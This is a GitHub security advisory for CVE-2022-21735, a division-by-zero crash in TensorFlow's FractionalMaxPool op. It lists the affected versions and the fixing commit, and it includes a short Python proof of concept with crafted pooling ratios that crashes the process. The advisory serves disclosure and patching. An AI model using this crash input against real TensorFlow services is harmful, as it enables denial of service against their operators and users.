# [H] Division by zero in Tensorflow

## Summary
Severity: High
Advisory: GHSA-87v6-crgm-2gfj
CVE: CVE-2022-21735
CWE: CWE-369
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-02-10
Source: https://github.com/advisories/GHSA-87v6-crgm-2gfj
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.5.3
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.1

## Details
### Impact 
The [implementation of `FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_max_pool_op.cc#L36-L192) can be made to crash a TensorFlow process via a division by 0:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.FractionalMaxPool(
  value=tf.constant(value=[[[[1, 4, 2, 3]]]], dtype=tf.int64),
  pooling_ratio=[1.0, 1.44, 1.73, 1.0],
  pseudo_random=False,
  overlapping=False,
  deterministic=False,
  seed=0,
  seed2=0,
  name=None)
```

### Patches
We have patched the issue in GitHub commit [ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb](https://github.com/tensorflow/tensorflow/commit/ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-87v6-crgm-2gfj
- https://nvd.nist.gov/vuln/detail/CVE-2022-21735
- https://github.com/tensorflow/tensorflow/commit/ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2022-59.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2022-114.yaml
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_max_pool_op.cc#L36-L192
